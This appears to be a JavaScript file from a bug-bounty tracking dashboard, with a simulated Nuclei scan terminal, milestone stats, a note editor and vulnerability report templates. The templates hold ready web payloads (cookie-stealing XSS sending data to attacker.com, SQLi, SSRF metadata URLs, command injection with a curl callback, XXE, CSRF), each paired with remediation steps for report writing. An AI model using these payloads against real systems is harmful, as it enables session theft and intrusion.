  }
}

window.toggleNucleiOptions = function() {
  const panel = document.getElementById('nuclei-options-panel');
  if (panel) {
    panel.classList.toggle('open');
  }
}

window.clearNucleiFilters = function() {
  nucleiTagFilter = '';
  nucleiSeverityFilter = '';
  nucleiSearch = '';
  nucleiSortBy = 'default';
  
  const searchInput = document.getElementById('nuclei-search');
  if (searchInput) searchInput.value = '';
  
  const tagSelect = document.getElementById('nuclei-filter-tag');
  if (tagSelect) tagSelect.value = '';
  
  const sevSelect = document.getElementById('nuclei-filter-severity');
  if (sevSelect) sevSelect.value = '';
  
  const sortSelect = document.getElementById('nuclei-sort-by');
  if (sortSelect) sortSelect.value = 'default';
  
  // Uncheck advanced checkboxes
  document.querySelectorAll('#nuclei-options-panel input[type="checkbox"]').forEach(cb => cb.checked = false);
  const concurrencySelect = document.getElementById('nuclei-opt-concurrency');
  if (concurrencySelect) concurrencySelect.value = '';
  
  renderNucleiTemplates();
  toast('Filters cleared', 'success');
}

let nucleiScanInterval = null;
window.isNucleiScanRunning = function() {
  return nucleiScanInterval !== null;
};

window.runSimulatedNucleiScan = function(templateId) {
  const overlay = document.getElementById('modal-nuclei-terminal');
  const termBody = document.getElementById('nuclei-term-body');
  const progressFill = document.getElementById('nuclei-term-progress-fill');
  const progressText = document.getElementById('nuclei-term-progress-text');
  const statusDot = document.getElementById('nuclei-term-status-dot');
  const statusText = document.getElementById('nuclei-term-status-text');
  const stopBtn = document.getElementById('nuclei-term-stop-btn');
  
  if (!overlay || !termBody) return;
  
  if (nucleiScanInterval) clearInterval(nucleiScanInterval);
  
  overlay.classList.add('open');
  
  const targetVal = document.getElementById('nuclei-target')?.value.trim() || 'https://target.com';
  const template = nucleiTemplates.find(t => t.id === templateId) || { id: templateId, name: 'Custom Scan', cmd: 'nuclei -u {target}', severity: 'info' };
  
  let suffix = '';
  if (document.getElementById('nuclei-opt-silent')?.checked) suffix += ' -silent';
  if (document.getElementById('nuclei-opt-stats')?.checked) suffix += ' -stats';
  if (document.getElementById('nuclei-opt-nometa')?.checked) suffix += ' -no-meta';
  if (document.getElementById('nuclei-opt-json')?.checked) suffix += ' -json';
  const concurrency = document.getElementById('nuclei-opt-concurrency')?.value;
  if (concurrency) suffix += ` -c ${concurrency}`;
  
  const fullCmd = template.cmd.replace('{target}', targetVal) + suffix;
  
  termBody.innerHTML = '';
  if (progressFill) progressFill.style.width = '0%';
  if (progressText) progressText.textContent = '0%';
  if (statusDot) {
    statusDot.className = 'nuclei-terminal-status-dot running';
  }
  if (statusText) statusText.textContent = 'Running';
  if (stopBtn) stopBtn.style.display = 'inline-block';
  
  function addLine(htmlContent) {
    const line = document.createElement('div');
    line.className = 'nuclei-terminal-line';
    line.innerHTML = htmlContent;
    termBody.appendChild(line);
    termBody.scrollTop = termBody.scrollHeight;
  }
  
  addLine(`<span class="term-prompt">0xhunter@antigravity:~$</span> <span class="term-cmd">${esc(fullCmd)}</span>`);
  
  const lines = [];
  lines.push(`<span class="term-info">[INF]</span> Current nuclei version: v3.2.4 (latest)`);
  lines.push(`<span class="term-info">[INF]</span> Current templates version: v9.8.7 (latest)`);
  lines.push(`<span class="term-info">[INF]</span> Loading template: <span style="color:var(--accent)">${esc(template.id)}</span>`);
  lines.push(`<span class="term-info">[INF]</span> Targets loaded: 1`);
  lines.push(`<span class="term-info">[INF]</span> Running scan on: <span style="color:var(--yellow)">${esc(targetVal)}</span>`);
  
  if (templateId === 'full-scan') {
    lines.push(`<span class="term-info">[INF]</span> Loaded 148 templates in memory`);
    lines.push(`<span class="term-info">[INF]</span> [wp-enum] Checking WordPress plugin versions...`);
    lines.push(`<span class="term-info">[INF]</span> [exposed-env] Requesting .env file at target root...`);
    lines.push(`<span class="term-vuln-high">[2026-06-18 16:38:02] [exposed-env] [http] [high]</span> <a href="${esc(targetVal)}/.env" target="_blank" style="color:var(--text1)">${esc(targetVal)}/.env</a>`);
    lines.push(`<span class="term-info">[INF]</span> [xss-reflected] Probing input parameters for XSS...`);
    lines.push(`<span class="term-vuln-med">[2026-06-18 16:38:05] [xss-reflected] [http] [medium]</span> <span style="color:var(--text2)">${esc(targetVal)}/search?q=%3Csvg%2Fonload%3Dalert%281%29%3E</span>`);
    lines.push(`<span class="term-info">[INF]</span> [subdomain-takeover] Querying DNS record mappings...`);
    lines.push(`<span class="term-info">[INF]</span> [secret-hunt] Checking exposed API keys...`);
    lines.push(`<span class="term-success">[INF]</span> Scan completed. 2 vulnerabilities detected (1 High, 1 Medium).`);
  } else if (templateId === 'fast-recon') {
    lines.push(`<span class="term-info">[INF]</span> Loaded 32 recon templates`);
    lines.push(`<span class="term-info">[INF]</span> Checking directories and files exposure...`);
    lines.push(`<span class="term-vuln-high">[2026-06-18 16:38:02] [git-exposed] [http] [high]</span> <span style="color:var(--text2)">${esc(targetVal)}/.git/config</span>`);
    lines.push(`<span class="term-vuln-med">[2026-06-18 16:38:03] [swagger-api] [http] [medium]</span> <span style="color:var(--text2)">${esc(targetVal)}/swagger-ui.html</span>`);
    lines.push(`<span class="term-success">[INF]</span> Scan completed. 2 vulnerabilities detected (1 High, 1 Medium).`);
  } else {
    const sev = template.severity || 'info';
    let path = 'api/v1';
    if (templateId.includes('git')) path = '.git/config';
    else if (templateId.includes('env')) path = '.env';
    else if (templateId.includes('phpinfo')) path = 'phpinfo.php';
    else if (templateId.includes('swagger')) path = 'swagger-ui.html';
    
    lines.push(`<span class="term-info">[INF]</span> Sending exploit/recon payloads...`);
    lines.push(`<span class="term-info">[INF]</span> Evaluating response headers and body content...`);
    
    const cSev = sev.toUpperCase();
    const cClass = `term-vuln-${sev === 'critical' ? 'crit' : sev}`;
    lines.push(`<span class="${cClass}">[2026-06-18 16:38:03] [${esc(template.id)}] [http] [${esc(sev)}]</span> <span style="color:var(--text1)">${esc(targetVal)}/${esc(path)}</span>`);
    lines.push(`<span class="term-success">[INF]</span> Scan completed. 1 vulnerability detected (1 ${cSev}).`);
  }
  
  let lineIdx = 0;
  nucleiScanInterval = setInterval(() => {
    if (lineIdx < lines.length) {
      addLine(lines[lineIdx]);
      lineIdx++;
      const progressPercent = Math.min(100, Math.floor((lineIdx / lines.length) * 100));
      if (progressFill) progressFill.style.width = `${progressPercent}%`;
      if (progressText) progressText.textContent = `${progressPercent}%`;
    } else {
      clearInterval(nucleiScanInterval);
      nucleiScanInterval = null;
      if (statusDot) {
        statusDot.className = 'nuclei-terminal-status-dot';
        statusDot.style.background = '#22c55e';
      }
      if (statusText) statusText.textContent = 'Completed';
      if (stopBtn) stopBtn.style.display = 'none';
      addLine(`<span class="term-prompt">0xhunter@antigravity:~$</span> <span class="nuclei-terminal-cursor"></span>`);
      toast('Nuclei scan completed!', 'success');
    }
  }, 400);
}

window.stopSimulatedNucleiScan = function() {
  if (nucleiScanInterval) {
    clearInterval(nucleiScanInterval);
    nucleiScanInterval = null;
    
    const statusDot = document.getElementById('nuclei-term-status-dot');
    const statusText = document.getElementById('nuclei-term-status-text');
    const stopBtn = document.getElementById('nuclei-term-stop-btn');
    const termBody = document.getElementById('nuclei-term-body');
    
    if (statusDot) {
      statusDot.className = 'nuclei-terminal-status-dot';
      statusDot.style.background = '#f59e0b';
    }
    if (statusText) statusText.textContent = 'Stopped';
    if (stopBtn) stopBtn.style.display = 'none';
    
    if (termBody) {
      const line = document.createElement('div');
      line.className = 'nuclei-terminal-line';
      line.innerHTML = `<span style="color:#ef4444; font-weight:bold;">[!] Scan interrupted by user.</span>\n<span class="term-prompt">0xhunter@antigravity:~$</span> <span class="nuclei-terminal-cursor"></span>`;
      termBody.appendChild(line);
      termBody.scrollTop = termBody.scrollHeight;
    }
    toast('Scan stopped', 'warning');
  }
}

window.clearNucleiTerminal = function() {
  const termBody = document.getElementById('nuclei-term-body');
  if (termBody) {
    termBody.innerHTML = `<span class="term-prompt">0xhunter@antigravity:~$</span> <span class="nuclei-terminal-cursor"></span>`;
  }
}

window.closeNucleiTerminal = function() {
  if (nucleiScanInterval) {
    stopSimulatedNucleiScan();
  }
  const overlay = document.getElementById('modal-nuclei-terminal');
  if (overlay) {
    overlay.classList.remove('open');
  }
}

// ── VULNERABILITY TEMPLATES ───────────────────────────────────
const vulnTemplates = {
  XSS: {
    title: 'Stored XSS in [Parameter] leading to Session Hijacking',
    type: 'XSS', sev: 'high', cvss: '7.5',
    desc: `1. Log in to the application and navigate to [Profile/Comment/Feature] page.\n2. In the [field name] input, enter the payload: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>\n3. Save/submit the input.\n4. Log in as a different user (victim) and navigate to the page where the content is rendered.\n5. Observe that the attacker's script executes in the victim's browser context.\n6. The victim's session cookies are sent to the attacker's server.`,
    payload: `<script>fetch('https://attacker.com/steal?c='+btoa(document.cookie))</script>\n\n<!-- Filter bypass variants: -->\n<img src=x onerror="fetch('https://attacker.com/?c='+btoa(document.cookie))">\n<svg/onload="fetch('https://attacker.com/?c='+btoa(document.cookie))">`,
    remediation: `1. Implement proper output encoding for all user-supplied data before rendering in HTML.\n2. Implement a strict Content Security Policy (CSP) that disallows inline scripts.\n3. Use the HttpOnly flag on session cookies to prevent JavaScript access.\n4. Validate and sanitize all input on both client and server side.`
  },
  SQLi: {
    title: 'SQL Injection in [Parameter] — Authentication Bypass / Data Exfiltration',
    type: 'SQLi', sev: 'critical', cvss: '9.8',
    desc: `1. Navigate to the [Login/Search/Filter] endpoint: [URL]\n2. Intercept the request using Burp Suite.\n3. Inject the payload into the [parameter] field.\n4. Observe the application returns data for other users / bypasses authentication.\n5. Using SQLMap to confirm: sqlmap -u "[URL]" -p "[param]" --dbs --batch`,
    payload: `' OR 1=1 --\n' UNION SELECT 1,username,password,4 FROM users--\n' AND (SELECT SLEEP(5))--\n'; SELECT pg_sleep(5)--`,
    remediation: `1. Use parameterized queries (prepared statements) for all database interactions.\n2. Implement an ORM that handles query building securely.\n3. Apply principle of least privilege to database accounts.\n4. Implement WAF rules to detect and block SQLi attempts.`
  },
  IDOR: {
    title: 'IDOR in [Endpoint] — Unauthorized Access to [Resource]',
    type: 'IDOR', sev: 'high', cvss: '7.5',
    desc: `1. Create two accounts: Attacker (attacker@evil.com) and Victim (victim@target.com).\n2. As Victim, perform the [action] and note the resource ID: [ID]\n3. Log in as Attacker and intercept the request to [endpoint].\n4. Replace the resource ID with the Victim's ID.\n5. Observe that the Attacker successfully accesses/modifies the Victim's data.`,
    payload: `# Original request (Attacker's own resource):\nGET /api/v1/users/12345/profile HTTP/1.1\n\n# Modified request (IDOR - accessing Victim's resource):\nGET /api/v1/users/12346/profile HTTP/1.1\n# Response contains Victim's private data`,
    remediation: `1. Implement server-side authorization checks to verify the requesting user owns or has permission to access the requested resource.\n2. Use indirect references (UUIDs instead of sequential IDs) as an additional layer of obscurity.\n3. Log all access attempts to sensitive resources for anomaly detection.`
  },
  SSRF: {
    title: 'Server-Side Request Forgery (SSRF) in [Feature] — Internal Resource Access',
    type: 'SSRF', sev: 'high', cvss: '8.6',
    desc: `1. Identify the endpoint that accepts a URL parameter: [URL]\n2. Send a request to your Burp Collaborator / RequestBin endpoint to confirm outbound HTTP interaction.\n3. Attempt to access internal metadata: http://169.254.169.254/latest/meta-data/\n4. Attempt to enumerate internal ports: http://127.0.0.1:[port]/\n5. Successfully retrieved: [sensitive data/IAM credentials/internal service info]`,
    payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://metadata.google.internal/computeMetadata/v1/?recursive=true\nhttp://127.0.0.1:8080/admin\nhttp://[::1]/admin\nhttp://0x7F000001/\nhttp://2130706433/`,
    remediation: `1. Implement a whitelist of allowed outbound URL destinations.\n2. Block requests to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16).\n3. Validate and sanitize all URL inputs before making server-side requests.\n4. Use a dedicated egress proxy that enforces access controls.`
  },
  RCE: {
    title: 'Remote Code Execution via [Vulnerability Type] in [Component]',
    type: 'RCE', sev: 'critical', cvss: '10.0',
    desc: `1. Navigate to [endpoint/feature]: [URL]\n2. Intercept the request using Burp Suite.\n3. Inject OS command through [parameter/header/field].\n4. Confirm execution by timing the response (sleep payload) or using OOB (DNS/HTTP callback).\n5. Demonstrate impact by reading /etc/passwd or running id command.`,
    payload: `; id\n; whoami\n; ping -c 5 burpcollaborator.net\n; curl https://burpcollaborator.net/callback?data=$(id)\n$(sleep 5)\n\`id\`\n\${{system("id")}}`,
    remediation: `1. Never pass user-controlled data to OS command execution functions.\n2. Use language-specific APIs instead of shell commands wherever possible.\n3. If shell execution is required, use parameterized inputs and strict allowlists.\n4. Run application processes with minimal OS privileges.`
  },
  AuthBypass: {
    title: 'Authentication Bypass via [Method] — Unauthorized Access',
    type: 'Auth Bypass', sev: 'critical', cvss: '9.8',
    desc: `1. Observe the authentication mechanism at: [URL]\n2. [Specific bypass technique: JWT alg none / missing token validation / etc.]\n3. Craft a modified request without valid authentication or with a manipulated token.\n4. Observe that the application grants access to protected resources.`,
    payload: `# JWT None Algorithm:\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyaWQiOjEsInJvbGUiOiJhZG1pbiJ9.\n\n# Direct API access without token:\nDELETE /api/v1/admin/users/1 HTTP/1.1\nHost: target.com`,
    remediation: `1. Implement strict token validation on all protected endpoints.\n2. Reject JWT tokens with algorithm "none" or weaker algorithms.\n3. Ensure all administrative functions verify both authentication and authorization.\n4. Implement proper session management with secure defaults.`
  },
  CSRF: {
    title: 'Cross-Site Request Forgery (CSRF) in [Action]',
    type: 'CSRF', sev: 'medium', cvss: '6.5',
    desc: `1. Log in to the application as a victim user.\n2. In a different tab, open the attacker's malicious HTML page.\n3. The malicious page automatically submits a form (or XHR) to [URL] performing [action].\n4. Since there are no CSRF tokens or SameSite cookie protections, the action succeeds using the victim's session.`,
    payload: `<html>\n  <body>\n    <form action="https://target.com/api/change-email" method="POST">\n      <input type="hidden" name="email" value="attacker@evil.com" />\n      <script>document.forms[0].submit();</script>\n    </form>\n  </body>\n</html>`,
    remediation: `1. Implement anti-CSRF tokens for all state-changing operations.\n2. Enforce SameSite=Lax or SameSite=Strict attributes on session cookies.\n3. Require re-authentication for highly sensitive actions (e.g., changing passwords).`
  },
  OpenRedirect: {
    title: 'Open Redirect in [Parameter] leading to Phishing/Token Leakage',
    type: 'Open Redirect', sev: 'medium', cvss: '5.4',
    desc: `1. Navigate to the endpoint with the redirect parameter: https://target.com/login?next=https://attacker.com\n2. Perform the expected action (e.g., log in).\n3. Observe that the application redirects the browser to the attacker-controlled domain.\n4. If OAuth is used, this can leak authorization codes or tokens via the Referer header or URL fragments.`,
    payload: `https://target.com/login?next=//attacker.com\nhttps://target.com/login?next=\\/attacker.com\nhttps://target.com/login?next=https:attacker.com\nhttps://target.com/login?next=%0d%0aLocation: https://attacker.com`,
    remediation: `1. Avoid using user-supplied input to determine the redirect destination.\n2. If dynamic redirects are necessary, implement a strict whitelist of allowed URLs or domains.\n3. Use an intermediate redirect warning page if redirecting to external sites.`
  },
  LFI: {
    title: 'Local File Inclusion (LFI) in [Parameter]',
    type: 'LFI/RFI', sev: 'high', cvss: '7.5',
    desc: `1. Identify a parameter that includes files: https://target.com/view?file=report.pdf\n2. Replace the file name with directory traversal payloads: ../../../../../etc/passwd\n3. Observe that the contents of the local system file are returned in the response.\n4. Attempt to read application source code or configuration files to escalate.`,
    payload: `../../../../../../etc/passwd\n..%2f..%2f..%2f..%2f..%2fetc%2fpasswd\n/var/www/html/index.php\nphp://filter/convert.base64-encode/resource=config.php`,
    remediation: `1. Never pass raw user input to filesystem APIs.\n2. If user input must map to a file, use an indirect reference map (e.g., file_id=1 maps to report.pdf).\n3. Validate input strictly against an allowlist of allowed file names.\n4. Strip directory traversal characters (e.g., dot-dot-slash) if direct use is unavoidable.`
  },
  XXE: {
    title: 'XML External Entity (XXE) Injection in [Endpoint]',
    type: 'XXE', sev: 'high', cvss: '8.2',
    desc: `1. Intercept a request to [endpoint] that accepts XML data.\n2. Inject an external entity declaration in the XML doctype.\n3. Reference the entity within the XML body.\n4. Observe that the response contains the contents of the requested local file (e.g., /etc/passwd) or triggers an out-of-band network request.`,
    payload: `<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<data>&xxe;</data>`,
    remediation: `1. Disable the resolution of external entities and DTDs in the XML parser configuration.\n2. Use simpler data formats like JSON instead of XML if possible.\n3. Update XML processing libraries to the latest secure versions.`
  },
  BAC: {
    title: 'Broken Access Control: User can [Action] on [Resource]',
    type: 'Broken Access Control', sev: 'high', cvss: '8.1',
    desc: `1. Log in as a standard user (low privileges).\n2. Attempt to access or modify a resource intended only for administrators at [URL].\n3. Observe that the application does not enforce proper authorization and allows the action.\n4. Example: Changing another user's role or accessing the admin dashboard.`,
    payload: `PATCH /api/v1/users/me HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{"role": "admin"}`,
    remediation: `1. Enforce authorization checks consistently on the server-side for every request.\n2. Deny access by default and explicitly grant access based on roles/permissions.\n3. Do not rely on client-side state (e.g., hidden fields, UI hiding) for access control.`
  },
  InfoDisclosure: {
    title: 'Information Disclosure: Sensitive Data Leak in [Endpoint]',
    type: 'Info Disclosure', sev: 'medium', cvss: '5.3',
    desc: `1. Navigate to [URL] without authentication (or with standard privileges).\n2. Inspect the HTTP response body, headers, or source code.\n3. Observe that sensitive information is disclosed.\n4. Leaked data includes: [API keys / PII / stack traces / internal IPs].`,
    payload: `GET /.git/config HTTP/1.1\nGET /api/v1/users (leaks password hashes)\nGET /phpinfo.php`,
    remediation: `1. Ensure sensitive files (e.g., .git, .env) are not accessible from the web root.\n2. Sanitize API responses to only include the minimum necessary data.\n3. Disable verbose error messages and stack traces in production environments.\n4. Implement proper access controls on all endpoints.`
  },
  BusinessLogic: {
    title: 'Business Logic Flaw: [Brief description of flaw]',
    type: 'Business Logic', sev: 'high', cvss: '7.5',
    desc: `1. Identify the intended business workflow (e.g., purchasing an item, applying a discount).\n2. Manipulate the sequence of steps, modify parameters unexpectedly (e.g., negative quantities), or bypass intended limits.\n3. Observe that the application enters an unintended state.\n4. Impact: [Free items / infinite credits / bypassing restrictions].`,
    payload: `# Example: Negative Quantity\nPOST /cart/add HTTP/1.1\n{"item_id": 123, "quantity": -5}\n\n# Example: Race Condition\nSend 10 concurrent requests to /redeem-coupon`,
    remediation: `1. Implement strict validation of all business logic rules on the server-side.\n2. Do not trust client-side validation or the sequence of client-side requests.\n3. Perform threat modeling to identify potential edge cases and logic bypasses.\n4. Ensure transactions and state changes are atomic and handle concurrency properly.`
  },
  RateLimiting: {
    title: 'Missing Rate Limiting on [Endpoint] (Brute Force / Enumeration)',
    type: 'Other', sev: 'medium', cvss: '5.3',
    desc: `1. Identify a sensitive endpoint (e.g., login, password reset, OTP verification).\n2. Send a large number of requests in rapid succession using Burp Intruder or a script.\n3. Observe that the application does not block or throttle the requests.\n4. Impact: Allows brute-forcing passwords, OTPs, or enumerating user accounts.`,
    payload: `POST /api/v1/login HTTP/1.1\nHost: target.com\n\n{"username": "admin", "password": "§password_list§"}`,
    remediation: `1. Implement strict rate limiting on all sensitive endpoints (e.g., login, OTP, API).\n2. Use mechanisms like CAPTCHA or exponential backoff after multiple failed attempts.\n3. Ensure rate limiting is applied per IP and per user account to prevent distributed attacks.`
  },
  CORS: {
    title: 'Insecure CORS Configuration allowing Data Theft',
    type: 'Info Disclosure', sev: 'medium', cvss: '5.4',
    desc: `1. Send a request to [URL] with the Origin header set to an attacker-controlled domain (e.g., Origin: https://evil.com).\n2. Observe that the response includes: Access-Control-Allow-Origin: https://evil.com and Access-Control-Allow-Credentials: true.\n3. Impact: An attacker can host a malicious script on evil.com that makes cross-origin requests to read the victim's sensitive data.`,
    payload: `GET /api/v1/profile HTTP/1.1\nHost: target.com\nOrigin: https://evil.com\nCookie: session=victim_token`,
    remediation: `1. Do not dynamically reflect the Origin header in the Access-Control-Allow-Origin response header.\n2. Define a strict whitelist of trusted origins that are allowed to make cross-origin requests.\n3. Avoid using the wildcard (*) for Access-Control-Allow-Origin if credentials are required.`
  }
};

function applyVulnTemplate(type) {
  const t = vulnTemplates[type];
  if (!t) return;
  document.getElementById('f-title').value = t.title;
  if (t.type) {
    document.getElementById('f-type').value = t.type;
  } else {
    document.getElementById('f-type').value = type === 'Auth Bypass' ? 'Auth Bypass' : type;
  }
  if (t.sev) document.getElementById('f-sev').value = t.sev;
  if (t.cvss) document.getElementById('f-cvss').value = t.cvss;
  
  document.getElementById('f-desc').value = t.desc;
  document.getElementById('f-payload').value = t.payload;
  document.getElementById('f-remediation').value = t.remediation;
  toast(`${type} template applied`, 'success');
}

// ── DEADLINE COUNTDOWN (Dashboard) ───────────────────────────
function renderDeadlineAlerts() {
  const el = document.getElementById('deadline-alerts');
  if (!el) return;
  const now = Date.now();
  const upcoming = S.targets.filter(t => t.deadline && t.status === 'active').map(t => {
    const dl = new Date(t.deadline).getTime();
    const days = Math.ceil((dl - now) / 86400000);
    return { ...t, daysLeft: days, deadlineMs: dl };
  }).filter(t => t.daysLeft <= 14).sort((a, b) => a.daysLeft - b.daysLeft);

  if (!upcoming.length) {
    el.style.display = 'none';
    return;
  }
  el.style.display = 'block';
  el.innerHTML = `
    <div class="card-head" style="padding: 16px 18px 0 18px; margin-bottom: 8px;"><div class="card-head-title">⏰ Upcoming Deadlines</div></div>
    ${upcoming.map(t => `
      <div class="deadline-item ${t.daysLeft <= 3 ? 'urgent' : t.daysLeft <= 7 ? 'warning' : ''}">
        <div class="deadline-name">${esc(t.name)}</div>
        <div class="deadline-date">${new Date(t.deadline).toLocaleDateString()}</div>
        <div class="deadline-days ${t.daysLeft <= 3 ? 'text-red' : t.daysLeft <= 7 ? 'text-orange' : 'text-yellow'}">
          ${t.daysLeft <= 0 ? '⚠️ OVERDUE' : t.daysLeft === 1 ? '1 day left' : t.daysLeft + ' days left'}
        </div>
      </div>`).join('')}`;
}

// ── HUNTING STATS / GAMIFICATION ─────────────────────────────
function renderHuntingStats() {
  const el = document.getElementById('hunting-stats');
  if (!el) return;
  const accepted = S.findings.filter(f => ['Accepted','Bounty Paid'].includes(f.status)).length;
  const dupes = S.findings.filter(f => f.status === 'Duplicate').length;
  const total = S.findings.length;
  const acceptRate = total > 0 ? Math.round(accepted / total * 100) : 0;
  const totalBounty = S.findings.reduce((acc, f) => acc + bountyAmount(f), 0);
  const criticals = S.findings.filter(f => f.severity === 'critical').length;

  const activeDays = new Set(S.findings.map(f => {
    const fTime = f.created_at ? new Date(f.created_at).getTime() : f.time || parseInt(f.created);
    return new Date(fTime).toDateString();
  }));

  const milestones = [
    { label: 'First Finding', achieved: total >= 1, icon: '🐛', val: total, target: 1, text: `${Math.min(total, 1)}/1 finding` },
    { label: 'First Critical', achieved: criticals >= 1, icon: '💀', val: criticals, target: 1, text: `${Math.min(criticals, 1)}/1 critical` },
    { label: '$100 Earned', achieved: totalBounty >= 100, icon: '💵', val: totalBounty, target: 100, text: `$${totalBounty}/$100` },
    { label: '$1,000 Earned', achieved: totalBounty >= 1000, icon: '💰', val: totalBounty, target: 1000, text: `$${totalBounty}/$1,000` },
    { label: '$10,000 Earned', achieved: totalBounty >= 10000, icon: '🏆', val: totalBounty, target: 10000, text: `$${totalBounty}/$10,000` },
    { label: '10 Findings', achieved: total >= 10, icon: '📊', val: total, target: 10, text: `${total}/10 findings` },
    { label: '5 Targets', achieved: S.targets.length >= 5, icon: '🎯', val: S.targets.length, target: 5, text: `${S.targets.length}/5 targets` },
    { label: '50 Findings', achieved: total >= 50, icon: '🔥', val: total, target: 50, text: `${total}/50 findings` }
  ];

  el.innerHTML = `
    <div class="stats-row" style="display:flex;justify-content:space-around;gap:12px;margin-bottom:20px;flex-wrap:wrap;">
      <div class="mini-stat" style="flex:1;min-width:100px;text-align:center;padding:12px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);"><div class="mini-stat-val" style="font-size:22px;font-weight:700;color:#fff;font-family:var(--mono);">${acceptRate}%</div><div class="mini-stat-label" style="font-size:11px;color:var(--text3);">Accept Rate</div></div>
      <div class="mini-stat" style="flex:1;min-width:100px;text-align:center;padding:12px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);"><div class="mini-stat-val" style="font-size:22px;font-weight:700;color:var(--red);font-family:var(--mono);">${dupes}</div><div class="mini-stat-label" style="font-size:11px;color:var(--text3);">Duplicates</div></div>
      <div class="mini-stat" style="flex:1;min-width:100px;text-align:center;padding:12px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);"><div class="mini-stat-val" style="font-size:22px;font-weight:700;color:var(--purple);font-family:var(--mono);">${criticals}</div><div class="mini-stat-label" style="font-size:11px;color:var(--text3);">Criticals</div></div>
      <div class="mini-stat" style="flex:1;min-width:100px;text-align:center;padding:12px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);"><div class="mini-stat-val" style="font-size:22px;font-weight:700;color:var(--green);font-family:var(--mono);">${activeDays.size}</div><div class="mini-stat-label" style="font-size:11px;color:var(--text3);">Active Days</div></div>
    </div>
    <div class="milestones-grid">
      ${milestones.map(m => {
        const pct = m.achieved ? 100 : Math.min(100, Math.round((m.val / m.target) * 100));
        return `
        <div class="milestone ${m.achieved ? 'achieved' : 'locked'}">
          <div class="milestone-icon">${m.icon}</div>
          <div class="milestone-label">${esc(m.label)}</div>
          ${m.achieved ? `
            <div class="milestone-check">✓ Achieved</div>
          ` : `
            <div class="milestone-progress">
              <div class="milestone-progress-track">
                <div class="milestone-progress-fill" style="width:${pct}%"></div>
              </div>
              <span class="milestone-progress-text">${esc(m.text)} (${pct}%)</span>
            </div>
          `}
        </div>`;
      }).join('')}
    </div>`;
}

// ── INIT ──────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  initScreenshotPaste();
  // Restore active session
  const savedSession = localStorage.getItem('0xh_active_session');
  if (savedSession) {
    try { activeSession = JSON.parse(savedSession); updateSessionDisplay(); sessionInterval = setInterval(updateSessionDisplay, 1000); } catch(e) {}
  }
});

// ── NOTES LIVE PREVIEW & FORMATTING TOOLBAR ────────────────────
let noteViewMode = 'edit'; // 'edit', 'split', 'preview'

window.setNoteViewMode = function(mode) {
  noteViewMode = mode;
  const wrapper = document.getElementById('note-editor-body-wrapper');
  const textarea = document.getElementById('edit-note-body');
  const preview = document.getElementById('note-preview-area');
  
  // Update toggle button active class
  document.querySelectorAll('#note-view-toggle button').forEach(btn => btn.classList.remove('active'));
  const activeBtn = document.getElementById(`nv-${mode}`);
  if (activeBtn) activeBtn.classList.add('active');
  
  if (!textarea || !preview || !wrapper) return;
  
  if (mode === 'edit') {
    wrapper.classList.remove('split-mode');
    textarea.style.display = 'block';
    preview.style.display = 'none';
  } else if (mode === 'preview') {
    wrapper.classList.remove('split-mode');
    preview.innerHTML = renderMarkdown(textarea.value);
    textarea.style.display = 'none';
    preview.style.display = 'block';
  } else if (mode === 'split') {
    wrapper.classList.add('split-mode');
    preview.innerHTML = renderMarkdown(textarea.value);
    textarea.style.display = 'block';
    preview.style.display = 'block';
  }
};

window.updateLivePreview = function() {
  const textarea = document.getElementById('edit-note-body');
  const preview = document.getElementById('note-preview-area');
  if (textarea && preview && noteViewMode === 'split') {
    preview.innerHTML = renderMarkdown(textarea.value);
  }
};

window.insertMarkdown = function(syntaxBefore, syntaxAfter = '') {
  const textarea = document.getElementById('edit-note-body');
  if (!textarea) return;
  const start = textarea.selectionStart;
  const end = textarea.selectionEnd;
  const text = textarea.value;
  const selectedText = text.substring(start, end);
  const replacement = syntaxBefore + selectedText + syntaxAfter;
  textarea.value = text.substring(0, start) + replacement + text.substring(end);
  textarea.focus();
  textarea.selectionStart = start + syntaxBefore.length;
  textarea.selectionEnd = start + syntaxBefore.length + selectedText.length;
  if (typeof autoSaveNote === 'function') {
    autoSaveNote();
  }
};
